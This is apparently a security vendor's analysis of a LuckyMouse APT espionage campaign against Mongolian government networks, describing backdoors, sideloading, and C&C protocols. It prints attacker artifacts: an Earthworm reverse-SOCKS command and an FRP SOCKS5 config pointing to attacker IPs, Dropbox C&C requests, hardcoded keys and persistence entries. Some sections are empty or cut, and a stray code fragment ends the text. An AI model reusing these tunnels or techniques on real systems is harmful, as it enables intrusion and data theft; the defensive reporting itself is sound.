<h1 class="wp-block-heading">Introduction&nbsp;</h1>



<p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p>



<p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p>



<p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment &#8211; a weaponized document using CVE-2017-11882.&nbsp;</p>



<p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p>



<h1 class="wp-block-heading">Attribution &amp; Clusterization</h1>



<p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<span style="color:#00ff15" class="has-inline-color"><em>IntgStat.exe</em></span>). This is a legitimate application that loads a DLL <span style="color:#00ff15" class="has-inline-color"><em>pcalocalresloader.dll</em></span>. By sideloading their own version <span style="color:#00ff15" class="has-inline-color"><em>pcalocalresloader.dll</em></span>, they load HyperBro RAT from a compressed and encrypted file<em> <span style="color:#00ff15" class="has-inline-color">thumbs.db</span></em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>].</p>



<p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em><span style="color:#00ff15" class="has-inline-color">thinprobe.exe</span></em> that loads <em><span style="color:#00ff15" class="has-inline-color">thinhostprobedll.dll</span></em>. This DLL was then used to sideload <em><span style="color:#00ff15" class="has-inline-color">thumb.db</span></em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p class="has-normal-font-size">We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p>



<h1 class="wp-block-heading">Infection Chain</h1>



<p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p>



<p class="has-text-color" style="color:#00ff15">Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p>



<p class="has-text-color" style="color:#00ff2a">XXXXXX_update.exe&nbsp;</p>



<p class="has-text-color" style="color:#00ff2a">(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p>



<p>This archive drops three already familiar files &#8211; Symantec’s <em><span style="color:#00ff15" class="has-inline-color">thinprobe.exe</span></em>, malicious <em><span style="color:#00ff15" class="has-inline-color">thinhostprobedll.dll</span></em>, and <em><span style="color:#00ff15" class="has-inline-color">thumb.db</span></em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em><span style="color:#00ff15" class="has-inline-color">thumb.db</span></em> and finally loading its processed content &#8211; a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p>

<h1 class="wp-block-heading">Toolset</h1>



<p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p>



<ul class="wp-block-list"><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul>



<p>In detail, we found the following tools:</p>



<h2 class="wp-block-heading">StartServiceTool</h2>



<p>This tool installs <em><span style="color:#00ff15" class="has-inline-color">wcm.dll</span></em> into <em><span style="color:#00ff15" class="has-inline-color">%WINDIR%\system32</span></em>, a registry record</p>



<p><span style="color:#00ff15" class="has-inline-color">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</span></p>



<p>is created with the following values:</p>



<p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p>



<p>DisplayName: Windows Connections Manager</p>



<p>ServiceDll: <span style="color:#00ff15" class="has-inline-color">C:\Windows\system32\wcm.dll</span>.</p>



<p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts &#8211; embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/" target="_blank" rel="noreferrer noopener">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p>



<p>The final payload DLL is written in GO and contains a single export named &#8220;<span style="color:#00ff15" class="has-inline-color">Interface</span>&#8220;. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is &#8220;<span style="color:#00ff15" class="has-inline-color">0000111122223333</span>&#8220;. The DLL additionally contains a default API key which appears to be for the authors test account.</p>



<p>Initially, it tries do download a file from Dropbox via the HTTP API:</p>



<p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {&#8220;path&#8221;: &#8220;/infos/000000.txt&#8221;}<br>Accept-Encoding: gzip</p>



<p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p>



<p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br><span style="font-size: inherit">User-Agent: Go-http-client/1.1<br></span>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {&#8220;path&#8221;: &#8220;/infos/116a0d.txt&#8221;,&#8221;mode&#8221;: &#8220;overwrite&#8221;,&#8221;autorename&#8221;: true,&#8221;mute&#8221;: false,&#8221;strict_conflict&#8221;: false}<br>Accept-Encoding: gzip</p>



<p><span style="font-size: inherit">%currentDate% %currentTime%##%hostname%</span></p>



<p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh6.googleusercontent.com/TWjSJB0IAQsj6KfXfB2FZKxILGcmI7Kpj85DqivileheKEVnpPEVb_L1R6rRnXnAF3RYHwMOBSdi95l0tty4dRncJ-mbTxQgfihvLdhc_7rdJILmNp4-dkWc4tWfnmnWlsRFh2vu" alt=""/><figcaption>Figure 2: Overview of detailed execution flow</figcaption></figure></div>

<p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p>

<h2 class="wp-block-heading">DataExtractor 1</h2>



<p>This tool can be used to gather potentially sensitive documents with <span style="color: #00ff00"><em>pdf</em></span>,<span style="color: #00ff00"><em> ppt</em></span>,<span style="color: #00ff00"><em> xls</em></span>, and <span style="color: #00ff00"><em>doc</em> </span>file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“<span style="color: #00ff00">zaq1xsw@cde3</span></em>”. This archive will be then saved to <span style="color: #00ff00"><em>C:\MSBuild\NVIDIA\ </em></span>under a filename <span style="color: #00ff00"><em>CRYPTO-%computerName%-%number_value%.SYS</em>.</span> This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p>



<p>After each run, a file <span style="color: #00ff00"><em>%windir%\system32\igfxme.vbs </em></span>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p>



<h2 class="wp-block-heading">DataExtractor 2</h2>



<p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p>



<p>Below you will see a part of an error message, providing us the information about how this utility is used:</p>



<p><span style="color: #00ff00"><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></span></p>



<p>More generally, the command’s format is:</p>



<p><span style="color: #00ff00"><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></span></p>



<h2 class="wp-block-heading">Information Collector</h2>



<p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p>



<p><span style="color: #00ff00"><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</span></p>



<p><span style="color: #00ff00"><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></span></p>



<div class="wp-block-image"><figure class="aligncenter is-resized"><img decoding="async" src="https://lh4.googleusercontent.com/jAfl89ftoNLu4TfBcvJd58-qU8oO7sjwOBNtGEptJrKWiqWpJlERDirza5VxlEx9tVQvxvFp_meEEzxq8CzknDJL0bQMzvFQdY_BcAuzeMlcq_NhgICPPF6Jv8uGogAx3N8zTWQR" alt="" width="551" height="497"/><figcaption><em>Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</em></figcaption></figure></div>



<p><em>It ensures its persistence by adding itself into Run (<span style="color: #00ff00">SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span>) registry key under <span style="color: #00ff00">AvpSecurity</span>.</em></p>



<p>Interestingly, it contains many unused functions using command-line tools such as: <span style="color: #00ff00">systeminfo</span>, <span style="color: #00ff00">arp</span>, <span style="color: #00ff00">ipconfig</span>, <span style="color: #00ff00">netstat</span>, and <span style="color: #00ff00">tasklist</span>. It also supports archiving the collected information using WinRAR with a hard-coded password “<span style="color: #00ff00">1qaz@WSX</span>”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p>



<p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p>



<h2 class="wp-block-heading">RAT</h2>



<h3 class="wp-block-heading">Korplug (PlugX)</h3>



<p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p>



<p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em><span style="color: #00ff00">http_dll.dll</span></em>. This DLL, in turn, decrypts <span style="color: #00ff00"><em>http_dll.dat</em></span> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p>



<p>Address of C&amp;C servers:&nbsp;</p>



<p><span style="color: #00ff00">web[.]microlynconline[.]com:80</span><br><span style="color: #00ff00">home[.]microlynconline[.]com:8000</span><br><span style="color: #00ff00">help[.]microlynconline[.]com:443</span><br><span style="color: #00ff00">host[.]microlynconline[.]com:53</span></p>



<h2 class="wp-block-heading">Backdoors</h2>



<p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p>



<h3 class="wp-block-heading">LuckyBack</h3>



<p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (<span style="color: #00ff00">45.77.55[.]145</span>). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p>



<h4 class="wp-block-heading">Technical:</h4>



<p>At first, the used code page is retrieved by calling <span style="color: #00ff00"><em>chcp</em></span>, a command providing the keyboard and character set information, on the system drive.</p>



<p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p>



<p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p>



<figure class="wp-block-table"><table><tbody><tr><td><strong>Commands</strong></td><td><strong>Functions</strong></td></tr><tr><td>0x70, 0x72</td><td>Receive data again</td></tr><tr><td>0x1, 0x11</td><td>Creates remote shell or quit remote shell</td></tr><tr><td>0x2</td><td>File size and last write from spec. file</td></tr><tr><td>0x3</td><td>It’s reads data from specific offset and file</td></tr><tr><td>0x4</td><td>Gets file size</td></tr><tr><td>0x12</td><td>Delete spec. file</td></tr><tr><td>0x13</td><td>Terminate specific thread</td></tr><tr><td>0x14</td><td>Receiving reading configuration</td></tr><tr><td>0x22</td><td>Execute %command% via CreateProcess API</td></tr><tr><td>0x23</td><td>Set a reading configuration for 0x3 command</td></tr><tr><td>0x24</td><td>Writes data to specific file</td></tr><tr><td>0x32</td><td>File operations (move file from one location to another)</td></tr><tr><td>0x50</td><td>Start keylogging</td></tr><tr><td>0x51</td><td>Stop keylogging</td></tr><tr><td>0x60</td><td>Take screenshot</td></tr></tbody></table></figure>



<h3 class="wp-block-heading">BlueTraveller</h3>



<p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p>



<p>The binary itself has its strings encrypted with RC4, using a hardcoded key “<span style="color: #00ff00">L!Q@W#E$R%T^Y&amp;U*A|}t~k</span>”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <span style="color: #00ff00"><a style="color: #00ff00" href="blank">http://go.vegispaceshop[.]org/shop.htm</a>.</span> The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh3.googleusercontent.com/VCn4BVgskyNIycpT3spkXv_-hRpIoxd1B78fRZn5bVhPalpfb0zw_rUEDPrhNFyBBwhpkBuuZhNhqie-B_roqtuUwyJUVNTtGWtudiL23VEIiEHUhmlP1cNBmeoHo0HQBjpTtb3-" alt=""/><figcaption>Figure 5: Response from first layer of C&amp;C server</figcaption></figure></div>



<p></p>



<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" decoding="async" src="https://lh6.googleusercontent.com/dQca4_CEh9vd8J6FserlbosNQ_1NGTaE7C6tLf4Kbb98By01FsA2YJXdcGNf9lXNtYAkPWX-zyUqDCxrZXYCUtD4RtnMvP-AvYo9g1YTEPPAscn8M-61kOzMYuQ2fZ1co9YlNuRH" alt="" width="766" height="797"/><figcaption>Figure 6: Script which decrypts the white spaces from the html response</figcaption></figure></div>



<p>The BlueTraveller uses the same scheme for encryption &#8211; AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string &#8220;<em><span style="color: #00ff00">0304276cf4f31345</span>&#8220;</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p>



<p><em><span style="color: #00ff00">http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</span></em></p>



<p>After this request is executed, commands are retrieved from:</p>



<p><em><span style="color:#0eff01" class="has-inline-color">http://&lt;second_layer_C&amp;C&gt;/index.htm.</span></em></p>



<p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p>



<p><span style="color: #00ff00"><span style="color:#00ff15" class="has-inline-color">http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</span></span></p>

<p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p>

<h4 class="wp-block-heading">Polpo &#8211; Communication</h4>



<p>The backdoor mimics the HTTP protocol to blend with the normal traffic. The transferred data is encrypted with AES and encoded into Base64 then sent as a part of fake HTML content.&nbsp;</p>

<h2 class="wp-block-heading">UAC bypass tool</h2>

It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p>



<h2 class="wp-block-heading">Port-scanners</h2>

<h2 class="wp-block-heading">Passwords dumpers</h2>



<p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noreferrer noopener">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer noopener">Lazagne</a> were seen on the infected computers. <h2 class="wp-block-heading">FRP</h2>



<p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <span style="color: #00ff00"><em>3bef4cd.tmp</em></span> for this proxy. The content of this proxy is the following:</p>



<p>[common]<br>server_addr = <span style="color: #00ff00">202.59.9[.]58</span><br>server_port =<span style="color: #00ff00"> 8443</span><br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = <span style="color: #00ff00">6001</span><br>plugin = socks5</p>



<p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via <span style="color: #00ff00">202.59.9[.]58:8443</span>.</p>

<h2 class="wp-block-heading">Earthworm tunneler</h2>



<p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em><span style="color: #00ff00">-s rssocks -d 139.180.155.133 -e 80</span></em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noreferrer noopener">http://rootkiter.com/EarthWorm/</a>.</p>



<h2 class="wp-block-heading">Conclusions</h2>



<p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p>



<p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p>

            if (separatorParentNode) {

            }
